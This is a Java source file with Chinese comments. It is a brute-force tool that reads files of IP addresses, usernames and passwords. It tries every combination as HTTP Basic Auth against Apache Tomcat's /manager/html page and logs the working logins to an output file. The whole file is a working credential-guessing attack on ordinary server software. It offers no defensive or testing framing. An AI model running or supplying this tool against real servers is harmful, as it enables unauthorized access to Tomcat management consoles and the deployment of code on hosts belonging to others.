import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Scanner;

public class Main {

	//存放ip地址的文件地址
	//输出地址为同一文件夹下
	private static String ip_txt ; 
	
	private static String password_txt;
	
	private static String username_txt;
	
	private static String output;
	
	public static void main(String[] args) {
		
		init();
		
		ArrayList<String> ip_list = readData(2);
		
		ArrayList<String> username_list = readData(0);
		
		ArrayList<String> password_list = readData(1);
		
		for(int i = 0; i < ip_list.size(); i++) {
			
			String ip = ip_list.get(i);
			
			System.out.println(ip);
			
			for(int j = 0; j < username_list.size(); j++) {
				
				String name = username_list.get(j);
				
				for(int k = 0; k < password_list.size(); k++) {
					
					String pwd = password_list.get(k);
					
					String param =  name + ":" + pwd;
					
					param = "Basic "+encodeBase64(param.getBytes());
					
					int code = getHttpHeadCode(ip, param);
					
					if(code == 200) {
						
						SaveFile(ip+"    "+username_list.get(j)+":"+password_list.get(k));
					}else if(code == 404) {
						
						k = password_list.size();
						
						j = username_list.size();
					}
				}
			}
		}
	}
	
	public static int getHttpHeadCode(String ip,String param) {
		
		ip.replace("/", "");
		
		if(ip.contains(":")) {
			
			ip = "http://"+ip+"/manager/html";
		}else {
			
			ip = "http://"+ip+":8082/manager/html";
		}
		
		URL url;
		try {
			url = new URL(ip);
			
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			
			conn.addRequestProperty("Accept",
					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
			
			conn.addRequestProperty("Accept-Encoding", "gzip, deflate, sdch, br");
			
			conn.addRequestProperty("Accept-Language", "zh-CN,zh;q=0.8");
			
			conn.addRequestProperty("Authorization", param);
			
			conn.setConnectTimeout(1500);
			
			conn.connect();
			
			return conn.getResponseCode();
			
		} catch (MalformedURLException e) {
			
			System.out.println(e.toString());
			
			return 404;
		} catch (IOException e) {
			
			System.out.println(e.toString());
			
			return 404;
		}
	}
	
	/*
	 * @param 0表示读账户,1表示读密码,2表示读ip地址
	 */
	@SuppressWarnings("resource")
	public static ArrayList<String> readData(int code) {
		ArrayList<String> list = new ArrayList<String>();
		
		String path = null;
		
		if(code == 0) {
			
			path = username_txt;
		}else if(code == 1) {
			
			path = password_txt;
		}else if(code == 2) {
			
			path = ip_txt;
		}
		
		File file = new File(path);
		
		FileInputStream fileInput;
		try {
			
			fileInput = new FileInputStream(file);
			
			BufferedReader read = new BufferedReader(new InputStreamReader(fileInput,"utf8"));
			
			String tmp = new String();
			
			while((tmp = read.readLine()) != null) {
				
				list.add(tmp);
			}
		} catch (FileNotFoundException e) {
			System.out.println(e.toString());
		} catch (IOException e) {
			System.out.println(e.toString());
		}
		
		return list;
	}
	
	public static void init() {
		@SuppressWarnings("resource")
		Scanner s = new Scanner(System.in);
		
		System.out.print("请输入ip.txt文件的存放地");
		
		ip_txt = s.nextLine();
		
		System.out.print("请输入password.txt文件的存放地址");
		
		password_txt = s.nextLine();
		
		System.out.print("请输入username.txt文件的存放地址");
		
		username_txt = s.nextLine();
		
		output = ip_txt.substring(0, ip_txt.length()-4);
		
		output += "_output.txt";
		
		File file = new File(output);
		
		if(!file.exists()) {
			
			try {
				file.createNewFile();
				
			} catch (IOException e) {
				System.out.println(e.toString());
			}
		}
		
	}

	
    public static String encodeBase64(byte[]input) {  
        
    	Class<?> clazz;
		try {
			clazz = Class.forName("com.sun.org.apache.xerces.internal.impl.dv.util.Base64");
			
			Method mainMethod= clazz.getMethod("encode", byte[].class);  
	        
	    	mainMethod.setAccessible(true);  
	        
	    	Object retObj=mainMethod.invoke(null, new Object[]{input});  
	        
	    	return (String)retObj;
			
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			System.out.println(e.toString());
		} catch (NoSuchMethodException e) {
			// TODO Auto-generated catch block
			System.out.println(e.toString());
		} catch (SecurityException e) {
			// TODO Auto-generated catch block
			System.out.println(e.toString());
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			System.out.println(e.toString());
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			System.out.println(e.toString());
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			System.out.println(e.toString());
		}  
        
    	return " ";
    }  
    
    
    public static void SaveFile(String data) {
    	try {
    		
			FileWriter file = new FileWriter(output,true);
			
			file.write(data);
			
			file.close();
		} catch (IOException e) {
			System.out.println(e.toString());
		}
    }
}
